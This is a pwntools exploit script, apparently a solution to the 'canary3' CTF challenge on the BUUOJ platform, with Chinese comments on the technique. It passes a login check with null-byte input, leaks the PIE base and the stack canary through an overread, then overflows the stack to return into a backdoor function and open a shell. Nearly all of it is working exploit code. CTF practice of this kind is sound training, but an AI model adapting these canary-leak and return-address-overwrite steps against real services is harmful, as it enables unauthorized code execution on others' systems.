# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './canary3'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25498'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda            : int( p.recv(14)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('3.exit',num)

one_gad = one_gadget(libc.path)

#本题可以将MD5前一个字节覆盖成\x00而绕过检查，同时也需要将输入的md5值前一个字节为\x00

sla("username:","admin\x00")

payload = "gB".ljust(0x20,"\x00")
#md5之后可以以00开头

sa("password:",payload)


#注意到栈上保存了程序text段的地址
cmd(2)
payload = "a"*0x7 + "b"
sa("input:",payload)

cmd(1)

ru("aaab")
pie_addr = u64(p.recv(6).ljust(8,'\x00')) - 0xa20

lg("pie_addr",pie_addr)


cmd(2)
payload = "a"*0x18 + "b"
sa("input:",payload)

cmd(1)
ru("aaab")
canary = u64(p.recv(7).rjust(8,'\x00'))

lg("canary",canary)

backdoor = pie_addr + 0x00000000000239F
cmd(2)
payload = "a"*0x18 + p64(canary) + "a"*0x8 + p64(backdoor)
sa("input:",payload)
cmd(3)


p.interactive()

'''
@File    :   canary3.py
@Time    :   2021/08/05 10:39:49
@Author  :   Niyah 
'''